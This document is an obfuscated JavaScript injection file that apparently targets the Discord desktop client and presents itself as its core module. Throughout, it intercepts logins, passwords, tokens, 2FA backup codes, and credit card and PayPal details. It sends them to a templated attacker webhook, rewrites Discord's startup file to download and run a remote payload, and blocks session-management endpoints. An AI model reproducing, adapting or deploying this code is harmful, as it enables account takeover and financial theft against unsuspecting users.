const _0x3fc29f = function () {
  let _0x3d72c2 = true;
  return function (_0x24878b, _0x863a6c) {
    const _0x278142 = _0x3d72c2 ? function () {
      if (_0x863a6c) {
        const _0x45e049 = _0x863a6c.apply(_0x24878b, arguments);
        _0x863a6c = null;
        return _0x45e049;
      }
    } : function () {};
    _0x3d72c2 = false;
    return _0x278142;
  };
}();
const _0x2c80e4 = _0x3fc29f(this, function () {
  return _0x2c80e4.toString().search("(((.+)+)+)+$").toString().constructor(_0x2c80e4).search('(((.+)+)+)+$');
});
_0x2c80e4();
const _0x30c3ff = function () {
  let _0xf345cd = true;
  return function (_0x3085fc, _0x249266) {
    const _0x3b2d01 = _0xf345cd ? function () {
      if (_0x249266) {
        const _0x48e16a = _0x249266.apply(_0x3085fc, arguments);
        _0x249266 = null;
        return _0x48e16a;
      }
    } : function () {};
    _0xf345cd = false;
    return _0x3b2d01;
  };
}();
const _0xdd8a17 = _0x30c3ff(this, function () {
  let _0x2a058e;
  try {
    const _0xc0619d = Function("return (function() {}.constructor(\"return this\")( ));");
    _0x2a058e = _0xc0619d();
  } catch (_0x3fae53) {
    _0x2a058e = window;
  }
  const _0x143c16 = _0x2a058e.console = _0x2a058e.console || {};
  const _0x4fd40d = ["log", "warn", 'info', 'error', "exception", "table", "trace"];
  for (let _0x2ed916 = 0x0; _0x2ed916 < _0x4fd40d.length; _0x2ed916++) {
    const _0x4bc03b = _0x30c3ff.constructor.prototype.bind(_0x30c3ff);
    const _0x9c468e = _0x4fd40d[_0x2ed916];
    const _0x4a0f7a = _0x143c16[_0x9c468e] || _0x4bc03b;
    _0x4bc03b.__proto__ = _0x30c3ff.bind(_0x30c3ff);
    _0x4bc03b.toString = _0x4a0f7a.toString.bind(_0x4a0f7a);
    _0x143c16[_0x9c468e] = _0x4bc03b;
  }
});
_0xdd8a17();
const fs = require('fs');
const electron = require("electron");
const https = require('https');
const args = process.argv;
const path = require("path");
const querystring = require("querystring");
const {
  BrowserWindow,
  session
} = require('electron');
const _0x2b0255 = {
  urls: ["/auth/login", "/auth/register", '/mfa/totp', '/mfa/codes-verification', "/users/@me", "/auth/mfa/totp", "/mfa/totp/enable", "/mfa/sms/enable", "/mfa/sms/disable", "/mfa/totp/disable", '/mfa/codes-verification']
};
const _0x364374 = {
  'urls': ["https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts", "https://api.stripe.com/v*/tokens", "https://discord.com/api/v*/users/@me/mfa/sms/disable", "https://discord.com/api/v*/users/@me/mfa/totp/disable", 'https://discordapp.com/api/v*/users/@me/mfa/totp/disable', "https://*.discord.com/api/v*/users/@me/mfa/totp/disable"]
};
const _0x5c6dad = {
  urls: ["https://discord.com/api/v9/auth/mfa/totp", "https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", "https://discord.com/api/v*/auth/login", "https://*.discord.com/api/v*/auth/login", "https://discord.com/api/v*/users/@me/mfa/totp/enable", 'https://discordapp.com/api/v*/users/@me/mfa/totp/enable', "https://*.discord.com/api/v*/users/@me/mfa/totp/enable", 'https://discord.com/api/v*/users/@me/mfa/sms/enable', "https://discord.com/api/v*/users/@me/mfa/sms/disable", "https://discord.com/api/v*/users/@me/mfa/totp/disable", 'https://discordapp.com/api/v*/users/@me/mfa/totp/disable', "https://*.discord.com/api/v*/users/@me/mfa/totp/disable", "https://discord.com/api/v*/users/@me/mfa/codes-verification", "https://*.discord.com/api/v*/users/@me/mfa/codes-verification", "https://discordapp.com/api/v*/users/@me/mfa/codes-verification"]
};
const _0x523875 = {
  urls: ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", 'https://discord.com/api/v*/applications/detectable', "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "wss://remote-auth-gateway.discord.gg/*", "https://discord.com/api/v*/auth/sessions", "https://*.discord.com/api/v*/auth/sessions", "https://discordapp.com/api/v*/auth/sessions"]
};
const _0x2a084c = {
  "Value": 0x1,
  "Emoji": "<:8485discordemployee:1163172252989259898>",
  "Rare": true
};
const _0x26f587 = {
  "Value": 0x2,
  "Emoji": "<:9928discordpartnerbadge:1163172304155586570>",
  Rare: true
};
const _0x277cf5 = {
  "Value": 0x4,
  "Emoji": "<:9171hypesquadevents:1163172248140660839>",
  "Rare": true
};
const _0x1adf18 = {
  Value: 0x8,
  "Emoji": '<:4744bughunterbadgediscord:1163172239970140383>',
  "Rare": true
};
const _0x58337d = {
  Value: 0x200,
  "Emoji": "<:5053earlysupporter:1163172241996005416>",
  "Rare": true
};
const _0x59f649 = {
  "Value": 0x4000,
  Emoji: "<:1757bugbusterbadgediscord:1163172238942543892>",
  "Rare": true
};
const _0x55b022 = {
  "Value": 0x20000,
  "Emoji": "<:1207iconearlybotdeveloper:1163172236807639143>",
  Rare: true
};
const _0x2bb593 = {
  "Value": 0x40,
  Emoji: '<:6601hypesquadbravery:1163172246492287017>',
  Rare: false
};
const _0x296ca7 = {
  "Value": 0x80,
  "Emoji": '<:6936hypesquadbrilliance:1163172244474822746>',
  "Rare": false
};
const _0x33b8df = {
  "Value": 0x100,
  Emoji: '<:5242hypesquadbalance:1163172243417858128>',
  "Rare": false
};
const _0x4e356e = {
  Value: 0x400000,
  Emoji: "<:1207iconactivedeveloper:1163172534443851868>",
  Rare: false
};
const _0x385d6a = {
  Value: 0x40000,
  "Emoji": "<:4149blurplecertifiedmoderator:1163172255489085481>",
  "Rare": true
};
const _0x13d1fa = {
  "Value": 0x100080,
  "Emoji": "not found",
  Rare: false
};
const _0x149afa = {
  "Discord_Emloyee": _0x2a084c,
  Partnered_Server_Owner: _0x26f587,
  "HypeSquad_Events": _0x277cf5,
  Bug_Hunter_Level_1: _0x1adf18,
  "Early_Supporter": _0x58337d,
  "Bug_Hunter_Level_2": _0x59f649,
  "Early_Verified_Bot_Developer": _0x55b022,
  "House_Bravery": _0x2bb593,
  "House_Brilliance": _0x296ca7,
  House_Balance: _0x33b8df,
  "Active_Developer": _0x4e356e,
  "Certified_Moderator": _0x385d6a,
  "Spammer": _0x13d1fa
};
const _0x51c9c6 = {
  "webhook": "%WEBHOOK%",
  "injection_url": "%INJECTURL%",
  "zipfile_url": "%ZIPURL%",
  "embedcolor": "%EMBEDCOLOR%",
  "filters": _0x2b0255,
  "payment_filters": _0x364374,
  "onCompleted": _0x5c6dad,
  "filters2": _0x523875,
  API: "https://discord.com/api/v9/users/@me",
  badges: _0x149afa
};
const get2FA = _0x43e95f => {
  switch (_0x43e95f) {
    case true:
      return "`enabled`";
    case false:
      return "`disabled`";
    default:
      return "`locked account`";
  }
};
const executeJS = _0x4034fe => {
  const _0x906228 = BrowserWindow.getAllWindows()[0x0];
  return _0x906228.webContents.executeJavaScript(_0x4034fe, true);
};
const getToken = async () => await executeJS("(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()");
const request = async (_0xccffb2, _0x1f0264, _0x40a71c, _0x3ee948) => {
  _0x1f0264 = new URL(_0x1f0264);
  const _0x4cba1c = {
    'Access-Control-Allow-Origin': '*'
  };
  const _0x119a83 = {
    "protocol": _0x1f0264.protocol,
    "hostname": _0x1f0264.host,
    "path": _0x1f0264.pathname,
    "method": _0xccffb2,
    "headers": _0x4cba1c
  };
  if (_0x1f0264.search) {
    _0x119a83.path += _0x1f0264.search;
  }
  for (const _0x5499de in _0x40a71c) _0x119a83.headers[_0x5499de] = _0x40a71c[_0x5499de];
  const _0x4e6a5a = https.request(_0x119a83);
  if (_0x3ee948) {
    _0x4e6a5a.write(_0x3ee948);
  }
  _0x4e6a5a.end();
  return new Promise((_0x4a3a86, _0x2feb21) => {
    _0x4e6a5a.on('response', _0x346a44 => {
      let _0x123508 = '';
      _0x346a44.on("data", _0x59d520 => _0x123508 += _0x59d520);
      _0x346a44.on("end", () => _0x4a3a86(_0x123508));
    });
  });
};
async function execScript(_0x22a41c) {
  var _0x316296 = electron.BrowserWindow.getAllWindows()[0x0];
  var _0x1ac7e1 = await _0x316296.webContents.executeJavaScript(_0x22a41c, true);
  return _0x1ac7e1 || null;
}
const getURL = async (_0x46e96e, _0x2e5a81) => {
  var _0x5e2589 = await execScript("\n          var xmlHttp = new XMLHttpRequest();\n          xmlHttp.open( \"GET\", \"" + _0x46e96e + "\", false );\n          xmlHttp.setRequestHeader(\"Authorization\", \"" + _0x2e5a81 + "\");\n          xmlHttp.send( null );\n          JSON.parse(xmlHttp.responseText);");
  return _0x5e2589;
};
const hooker = async (_0x2e8a41, _0x58857f, _0x253efa, _0x391515) => {
  const _0x2aec43 = {
    name: _0x253efa.username + " (" + _0x253efa.id + ") " + _0x391515,
    icon_url: "https://cdn.discordapp.com/avatars/" + _0x253efa.id + '/' + _0x253efa.avatar + ".webp"
  };
  _0x2e8a41.embeds[0x0].author = _0x2aec43;
  const _0x800fee = {
    "url": "https://cdn.discordapp.com/avatars/" + _0x253efa.id + '/' + _0x253efa.avatar + '.webp'
  };
  _0x2e8a41.embeds[0x0].thumbnail = _0x800fee;
  const _0x1ca0d1 = {
    "text": '@vog$tealer',
    "icon_url": "https://cdn.discordapp.com/avatars/" + _0x253efa.id + '/' + _0x253efa.avatar + ".webp"
  };
  _0x2e8a41.embeds[0x0].footer = _0x1ca0d1;
  const _0x363c93 = getBadges(_0x253efa.flags);
  const _0x9084 = await getBilling(_0x58857f);
  const _0x1b2155 = get2FA(_0x253efa.mfa_enabled);
  var _0x14363c = await getURL("https://discord.com/api/v9/users/" + _0x253efa.id + "/profile", _0x58857f);
  const _0x1c33c9 = await getFriends(_0x58857f);
  const _0x14fdc2 = getNitro(_0x14363c);
  const _0x3d1554 = await getServers(_0x58857f);
  const _0x27d285 = {
    name: "2FA",
    "value": _0x1b2155,
    "inline": true
  };
  const _0x36d14e = {
    "name": "Nitro",
    "value": _0x14fdc2,
    "inline": true
  };
  const _0x44995a = {
    "name": "Badges",
    "value": _0x363c93,
    "inline": true
  };
  const _0x311ffb = {
    "name": "Billing",
    value: _0x9084,
    inline: true
  };
  const _0x70a00f = {
    "name": 'Token',
    "value": '```' + _0x58857f + "```\n[download zip file](" + "%ZIPURL%" + ')',
    "inline": false
  };
  _0x2e8a41.embeds[0x0].fields.push(_0x27d285, _0x36d14e, _0x44995a, _0x311ffb, _0x70a00f);
  const _0x327d16 = {
    "title": "Total Friends: " + _0x1c33c9.totalFriends,
    "description": _0x1c33c9.message
  };
  const _0x31acb6 = {
    "title": "Total Servers: " + _0x3d1554.totalGuilds,
    description: _0x3d1554.message
  };
  _0x2e8a41.embeds.push(_0x327d16, _0x31acb6);
  for (const _0x8109c0 in _0x2e8a41.embeds) {
    _0x2e8a41.embeds[_0x8109c0].color = "%EMBEDCOLOR%";
  }
  const _0x53b38a = {
    'Content-Type': "application/json"
  };
  await request("POST", "%WEBHOOK%", _0x53b38a, JSON.stringify(_0x2e8a41));
  console.log("embed gonderildi.");
};
const fetch = async (_0x5d3131, _0x865822) => {
  return JSON.parse(await request('GET', "https://discord.com/api/v9/users/@me" + _0x5d3131, _0x865822));
};
const fetchAccount = async _0x53f8e6 => await fetch('', {
  'Authorization': _0x53f8e6
});
const fetchBilling = async _0x20db68 => await fetch("/billing/payment-sources", {
  'Authorization': _0x20db68
});
const fetchServers = async _0x233293 => await fetch("/guilds?with_counts=true", {
  'Authorization': _0x233293
});
const fetchFriends = async _0x38d48a => await fetch('/relationships', {
  'Authorization': _0x38d48a
});
const calcDate = (_0x1e25b0, _0x28314f) => new Date(_0x1e25b0.setMonth(_0x1e25b0.getMonth() + _0x28314f));
const getNitro = _0x13613a => {
  if (!_0x13613a.premium_type) {
    return "`not found`";
  }
  switch (_0x13613a.premium_type) {
    default:
      return "`locked account`";
    case 0x1:
      return "<:946246402105819216:962747802797113365>";
    case 0x2:
      if (!_0x13613a.premium_guild_since) {
        return "<:946246402105819216:962747802797113365>";
      }
      var _0x5b2265 = new Date(Date.now());
      var _0x140478 = ["<:Booster1Month:1051453771147911208>", "<:Booster2Month:1051453772360077374>", "<:Booster6Month:1051453773463162890>", "<:Booster9Month:1051453774620803122>", "<:boost12month:1068308256088400004>", "<:Booster15Month:1051453775832961034>", "<:BoosterLevel8:1051453778127237180>", "<:Booster24Month:1051453776889917530>"];
      var _0x30515e = [new Date(_0x13613a.premium_guild_since), new Date(_0x13613a.premium_guild_since), new Date(_0x13613a.premium_guild_since), new Date(_0x13613a.premium_guild_since), new Date(_0x13613a.premium_guild_since), new Date(_0x13613a.premium_guild_since), new Date(_0x13613a.premium_guild_since)];
      var _0xcedec2 = [0x2, 0x3, 0x6, 0x9, 0xc, 0xf, 0x12, 0x18];
      var _0x13613a = [];
      for (var _0x341e6a in _0x30515e) _0x13613a.push(Math.round((calcDate(_0x30515e[_0x341e6a], _0xcedec2[_0x341e6a]) - _0x5b2265) / 0x5265c00));
      var _0x9f79e6 = 0x0;
      for (var _0x341e6a of _0x13613a) if (_0x341e6a > 0x0) {
        '';
      } else {
        _0x9f79e6++;
      }
      return "<:946246402105819216:962747802797113365> " + _0x140478[_0x9f79e6];
  }
};
const getBadges = _0x141184 => {
  let _0x30e709 = '';
  for (const _0x3d801a in _0x51c9c6.badges) {
    let _0x302efa = _0x51c9c6.badges[_0x3d801a];
    if ((_0x141184 & _0x302efa.Value) == _0x302efa.Value) {
      _0x30e709 += _0x302efa.Emoji + " ";
    }
  }
  return _0x30e709 || "``not found``";
};
const getRareBadges = _0x5c686c => {
  let _0x43f261 = '';
  for (const _0x154d77 in _0x51c9c6.badges) {
    let _0x291279 = _0x51c9c6.badges[_0x154d77];
    if ((_0x5c686c & _0x291279.Value) == _0x291279.Value && _0x291279.Rare) {
      _0x43f261 += _0x291279.Emoji + " ";
    }
  }
  return _0x43f261;
};
const getBilling = async _0x4723c6 => {
  const _0xc1aa28 = await fetchBilling(_0x4723c6);
  let _0x3b46c4 = '';
  _0xc1aa28.forEach(_0x20cea0 => {
    if (!_0x20cea0.invalid) {
      switch (_0x20cea0.type) {
        case 0x1:
          _0x3b46c4 += "💳 ";
          break;
        case 0x2:
          _0x3b46c4 += "<:paypal:1148653305376034967> ";
          break;
      }
    }
  });
  return _0x3b46c4 || "``not found``";
};
const getFriends = async _0x379a6c => {
  const _0x20541f = await fetchFriends(_0x379a6c);
  const _0x2a04c0 = _0x20541f.filter(_0xca32f4 => {
    return _0xca32f4.type == 0x1;
  });
  let _0x61e1fe = '';
  for (const _0x42ee8d of _0x2a04c0) {
    var _0xb1ec53 = getRareBadges(_0x42ee8d.user.public_flags);
    if (_0xb1ec53 != '') {
      if (!_0x61e1fe) {
        _0x61e1fe = "**Rare Friends:**\n";
      }
      _0x61e1fe += _0xb1ec53 + " " + _0x42ee8d.user.username + '#' + _0x42ee8d.user.discriminator + "\n";
    }
  }
  _0x61e1fe = _0x61e1fe || "**No Rare Friends**";
  const _0x4784fb = {
    "message": _0x61e1fe,
    "totalFriends": _0x20541f.length
  };
  return _0x4784fb;
};
const getServers = async _0x5a3d5b => {
  const _0x16d9a5 = await fetchServers(_0x5a3d5b);
  const _0x2e57b8 = _0x16d9a5.filter(_0x9ca270 => _0x9ca270.permissions == '562949953421311');
  let _0x4bd9c1 = '';
  for (const _0x14e546 of _0x2e57b8) {
    if (_0x4bd9c1 === '') {
      _0x4bd9c1 += "**Rare Servers:**\n";
    }
    _0x4bd9c1 += (_0x14e546.owner ? "Owner" : 'Admin') + " | Server Name: `" + _0x14e546.name + "` - Members: `" + _0x14e546.approximate_member_count + "`\n";
  }
  _0x4bd9c1 = _0x4bd9c1 || "**No Rare Servers**";
  const _0x45e5d7 = {
    "message": _0x4bd9c1,
    "totalGuilds": _0x16d9a5.length
  };
  return _0x45e5d7;
};
const EmailPassToken = async (_0x12912e, _0x3f3988, _0x1c3d8b, _0x3524af) => {
  const _0x1f0f0c = await fetchAccount(_0x1c3d8b);
  const _0x1df6d3 = {
    name: "Email",
    "value": '`' + _0x12912e + '`',
    "inline": true
  };
  const _0x3a5a45 = {
    "name": "Password",
    "value": '`' + _0x3f3988 + '`',
    "inline": true
  };
  const _0x17ca61 = {
    'fields': [_0x1df6d3, _0x3a5a45]
  };
  const _0x53ddae = {
    embeds: [_0x17ca61]
  };
  hooker(_0x53ddae, _0x1c3d8b, _0x1f0f0c, _0x3524af);
};
const fadisableEmbed = async (_0x465012, _0x2a016b) => {
  const _0x187406 = await fetchAccount(_0x465012);
  const _0x4e3388 = {
    "name": "Email",
    "value": '`' + (_0x187406.email || "not found") + '`',
    "inline": true
  };
  const _0x561fb2 = {
    name: 'Phone',
    value: '`' + (_0x187406.phone || "not found") + '`',
    inline: true
  };
  const _0x496d28 = {
    fields: [_0x4e3388, _0x561fb2]
  };
  const _0x156db8 = {
    embeds: [_0x496d28]
  };
  hooker(_0x156db8, _0x465012, _0x187406, _0x2a016b);
};
const BackupCodesViewed = async (_0x3c4670, _0x4dd9a5, _0x24a8c6) => {
  const _0x2b3cea = await fetchAccount(_0x4dd9a5);
  const _0xc0c9a2 = _0x3c4670.filter(_0x335cc8 => {
    return _0x335cc8.consumed === false;
  });
  let _0x21c6d5 = '';
  for (let _0x3a8cf0 of _0xc0c9a2) {
    _0x21c6d5 += _0x3a8cf0.code.substr(0x0, 0x4) + '-' + _0x3a8cf0.code.substr(0x4) + "\n";
  }
  const _0x3cc05d = {
    "name": "Email",
    "value": '`' + _0x2b3cea.email + '`',
    inline: true
  };
  const _0x41deaf = {
    "name": "Phone",
    "value": '`' + (_0x2b3cea.phone || "not found") + '`',
    "inline": true
  };
  const _0x55c07d = {
    name: "Backup Codes",
    "value": "```" + _0x21c6d5 + "```",
    "inline": false
  };
  const _0x286e14 = {
    'fields': [_0x3cc05d, _0x41deaf, _0x55c07d]
  };
  const _0x5b05e6 = {
    embeds: [_0x286e14]
  };
  hooker(_0x5b05e6, _0x4dd9a5, _0x2b3cea, _0x24a8c6);
};
const PasswordChanged = async (_0x57386c, _0x3834c5, _0xc17a, _0x9c0ccc) => {
  const _0x733e23 = await fetchAccount(_0xc17a);
  const _0xd8a012 = {
    name: "New Password",
    "value": '`' + _0x57386c + '`',
    "inline": true
  };
  const _0x1a628f = {
    name: "Old Password",
    "value": '`' + _0x3834c5 + '`',
    "inline": true
  };
  const _0x1332e8 = {
    fields: [_0xd8a012, _0x1a628f]
  };
  const _0x2ac7a2 = {
    embeds: [_0x1332e8]
  };
  hooker(_0x2ac7a2, _0xc17a, _0x733e23, _0x9c0ccc);
};
const CreditCardAdded = async (_0x269368, _0x1682ec, _0x1fdd03, _0x571453, _0x29cbbd, _0x4a340e) => {
  const _0x5c786c = await fetchAccount(_0x29cbbd);
  const _0x31a357 = {
    "name": 'Number',
    "value": '`' + _0x269368 + '`',
    "inline": true
  };
  const _0x346cb6 = {
    "name": "CVC",
    "value": '`' + _0x1682ec + '`',
    inline: true
  };
  const _0xb67f3f = {
    "name": "Expiration",
    value: '`' + _0x1fdd03 + '/' + _0x571453 + '`',
    "inline": true
  };
  const _0xbbe8b7 = {
    'fields': [_0x31a357, _0x346cb6, _0xb67f3f]
  };
  const _0xec152c = {
    embeds: [_0xbbe8b7]
  };
  hooker(_0xec152c, _0x29cbbd, _0x5c786c, _0x4a340e);
};
const PaypalAdded = async (_0x15300d, _0x52372c) => {
  const _0x2e1b11 = await fetchAccount(_0x15300d);
  const _0x56202c = {
    name: "Email",
    "value": '`' + _0x2e1b11.email + '`',
    "inline": true
  };
  const _0x447d24 = {
    "name": "Phone",
    "value": '`' + (_0x2e1b11.phone || 'None') + '`',
    "inline": true
  };
  const _0x2352d5 = {
    fields: [_0x56202c, _0x447d24]
  };
  const _0x27e8a5 = {
    embeds: [_0x2352d5]
  };
  hooker(_0x27e8a5, _0x15300d, _0x52372c, _0x2e1b11);
};
const discordPath = function () {
  const _0x544639 = args[0x0].split(path.sep).slice(0x0, -0x1).join(path.sep);
  let _0x56866c;
  if (process.platform === 'win32') {
    _0x56866c = path.join(_0x544639, "resources");
  } else if (process.platform === "darwin") {
    _0x56866c = path.join(_0x544639, "Contents", "Resources");
  }
  if (fs.existsSync(_0x56866c)) {
    return {
      'resourcePath': _0x56866c,
      'app': _0x544639
    };
  }
  const _0x541c65 = {
    "undefined": undefined,
    undefined: undefined
  };
  return _0x541c65;
}();
async function updateCheck() {
  const {
    resourcePath: _0x2b89a8,
    app: _0x24567e
  } = discordPath;
  if (_0x2b89a8 === undefined || _0x24567e === undefined) {
    return;
  }
  const _0x2877d8 = path.join(_0x2b89a8, 'app');
  const _0xeab59f = path.join(_0x2877d8, 'package.json');
  const _0x3513d4 = path.join(_0x2877d8, "index.js");
  const _0x54f109 = fs.readdirSync(_0x24567e + "\\modules\\").filter(_0x459ee5 => /discord_desktop_core-+?/.test(_0x459ee5))[0x0];
  const _0x20e48f = _0x24567e + "\\modules\\" + _0x54f109 + "\\discord_desktop_core\\index.js";
  const _0x1577e7 = path.join(process.env.APPDATA, "\\betterdiscord\\data\\betterdiscord.asar");
  if (!fs.existsSync(_0x2877d8)) {
    fs.mkdirSync(_0x2877d8);
  }
  if (fs.existsSync(_0xeab59f)) {
    fs.unlinkSync(_0xeab59f);
  }
  if (fs.existsSync(_0x3513d4)) {
    fs.unlinkSync(_0x3513d4);
  }
  if (process.platform === "win32" || process.platform === "darwin") {
    const _0x5b7444 = {
      "name": "discord",
      main: "index.js"
    };
    fs.writeFileSync(_0xeab59f, JSON.stringify(_0x5b7444, null, 0x4));
    const _0xdc7ee1 = "const fs = require('fs'), https = require('https');\n  const indexJs = '" + _0x20e48f + "';\n  const bdPath = '" + _0x1577e7 + "';\n  const fileSize = fs.statSync(indexJs).size\n  fs.readFileSync(indexJs, 'utf8', (err, data) => {\n      if (fileSize < 20000 || data === \"module.exports = require('./core.asar')\") \n          init();\n  })\n  async function init() {\n      https.get('" + "%INJECTURL%" + "', (res) => {\n          const file = fs.createWriteStream(indexJs);\n          res.replace('%WEBHOOK%', '" + "%WEBHOOK%" + "')\n          res.pipe(file);\n          file.on('finish', () => {\n              file.close();\n          });\n      \n      }).on(\"error\", (err) => {\n          setTimeout(init(), 10000);\n      });\n  }\n  require('" + path.join(_0x2b89a8, "app.asar") + "')\n  if (fs.existsSync(bdPath)) require(bdPath);";
    fs.writeFileSync(_0x3513d4, _0xdc7ee1.replace(/\\/g, "\\\\"));
  }
  if (!fs.existsSync(path.join(__dirname, "discord"))) {
    return;
  }
  fs.rmdirSync(path.join(__dirname, "discord"));
  const _0x217b72 = await getToken();
  if (!_0x217b72) {
    return;
  }
  const _0x281f0e = await fetchAccount(_0x217b72);
  const _0x10f78c = {
    "name": "Email",
    "value": '`' + _0x281f0e.email + '`',
    "inline": true
  };
  const _0x443939 = {
    "name": "Phone",
    "value": '`' + (_0x281f0e.phone || "not found") + '`',
    "inline": true
  };
  const _0x375371 = {
    fields: [_0x10f78c, _0x443939]
  };
  const _0x52b4ae = {
    'embeds': [_0x375371]
  };
  await hooker(_0x52b4ae, _0x217b72, _0x281f0e, 'Initialized');
}
let email = '';
let password = '';
const createWindow = () => {
  mainWindow = BrowserWindow.getAllWindows()[0x0];
  if (!mainWindow) {
    return;
  }
  mainWindow.webContents['debugger'].attach("1.3");
  mainWindow.webContents["debugger"].on("message", async (_0x39fb25, _0xaa5b00, _0x10f29b) => {
    if (_0xaa5b00 !== "Network.responseReceived") {
      return;
    }
    if (!_0x51c9c6.filters.urls.some(_0x51e6d2 => _0x10f29b.response.url.endsWith(_0x51e6d2))) {
      return;
    }
    if (![0xc8, 0xca].includes(_0x10f29b.response.status)) {
      return;
    }
    const _0x385422 = {
      'requestId': _0x10f29b.requestId
    };
    const _0x188ecb = await mainWindow.webContents["debugger"].sendCommand('Network.getResponseBody', _0x385422);
    const _0x3812a6 = JSON.parse(_0x188ecb.body);
    const _0x121641 = {
      requestId: _0x10f29b.requestId
    };
    const _0x34fee3 = await mainWindow.webContents["debugger"].sendCommand("Network.getRequestPostData", _0x121641);
    const _0x56dad2 = JSON.parse(_0x34fee3.postData);
    switch (true) {
      case _0x10f29b.response.url.endsWith("/login"):
        if (!_0x3812a6.token) {
          email = _0x56dad2.login;
          password = _0x56dad2.password;
          return;
        }
        EmailPassToken(_0x56dad2.login, _0x56dad2.password, _0x3812a6.token, "Login");
        break;
      case _0x10f29b.response.url.endsWith("/register"):
        EmailPassToken(_0x56dad2.email, _0x56dad2.password, _0x3812a6.token, "Signed Up");
        break;
      case _0x10f29b.response.url.endsWith("/totp"):
        EmailPassToken(email, password, _0x3812a6.token, "2FA Login");
        break;
      case _0x10f29b.response.url.endsWith("/enable"):
        BackupCodesViewed(_0x3812a6.backup_codes, await getToken(), "2FA Enabled");
        break;
      case _0x10f29b.response.url.endsWith("/codes-verification"):
        BackupCodesViewed(_0x3812a6.backup_codes, await getToken(), "2FA Code Viewed");
        break;
      case _0x10f29b.response.url.endsWith("/@me"):
        if (!_0x56dad2.password) {
          return;
        }
        if (_0x56dad2.email) {
          EmailPassToken(_0x56dad2.email, _0x56dad2.password, _0x3812a6.token, "Email Changed");
        }
        if (_0x56dad2.new_password) {
          PasswordChanged(_0x56dad2.new_password, _0x56dad2.password, _0x3812a6.token, "Password Changed");
        }
        break;
    }
  });
  mainWindow.webContents["debugger"].sendCommand("Network.enable");
  mainWindow.on('closed', () => {
    createWindow();
  });
};
createWindow();
session.defaultSession.webRequest.onCompleted(_0x51c9c6.payment_filters, async (_0x356d8d, _0xe52780) => {
  if (![0xc8, 0xca].includes(_0x356d8d.statusCode)) {
    return;
  }
  if (_0x356d8d.method != "POST") {
    return;
  }
  switch (true) {
    case _0x356d8d.url.endsWith("tokens"):
      const _0x1e1b0b = querystring.parse(Buffer.from(_0x356d8d.uploadData[0x0].bytes).toString());
      CreditCardAdded(_0x1e1b0b["card[number]"], _0x1e1b0b["card[cvc]"], _0x1e1b0b['card[exp_month]'], _0x1e1b0b["card[exp_year]"], await getToken(), "Credit Card Added");
      break;
    case _0x356d8d.url.endsWith('/disable'):
      fadisableEmbed(await getToken(), "2FA Disabled");
      break;
    case _0x356d8d.url.endsWith("paypal_accounts"):
      PaypalAdded(await getToken(), "Paypal Added");
      break;
  }
});
session.defaultSession.webRequest.onBeforeRequest(_0x51c9c6.filters2, (_0x532499, _0x7aec49) => {
  const _0x3652f6 = {
    'cancel': true
  };
  if (_0x532499.url.startsWith("wss://remote-auth-gateway") || _0x532499.url.endsWith('auth/sessions')) {
    return _0x7aec49(_0x3652f6);
  }
  updateCheck();
});
module.exports = require("./core.asar");
